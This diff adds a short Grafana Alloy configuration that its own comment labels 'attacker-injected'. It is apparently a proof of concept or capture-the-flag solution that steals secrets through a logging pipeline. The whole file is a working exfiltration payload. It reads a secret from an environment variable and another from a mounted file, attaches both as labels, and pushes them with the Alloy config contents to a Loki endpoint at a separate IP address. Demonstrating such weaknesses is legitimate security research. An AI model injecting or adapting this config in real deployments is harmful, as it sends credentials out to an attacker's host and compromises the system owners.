@@ -1,0 +1,24 @@
+// Attacker-injected config: flags 1+2 — env var + mounted Secret exfil
+declare "user_pipeline" {
+  local.file "secret_2" {
+    filename = "/etc/security-poc/SECRET_2"
+  }
+
+  loki.source.file "exfil" {
+    targets = [{
+      __path__ = "/etc/alloy/config.alloy",
+      job      = "alloy-config",
+    }]
+    forward_to = [loki.write.exfil.receiver]
+  }
+
+  loki.write "exfil" {
+    endpoint {
+      url = "http://192.168.0.154:3100/loki/api/v1/push"
+    }
+    external_labels = {
+      demo_1 = sys.env("SECRET_1"),
+      demo_2 = local.file.secret_2.content,
+    }
+  }
+}
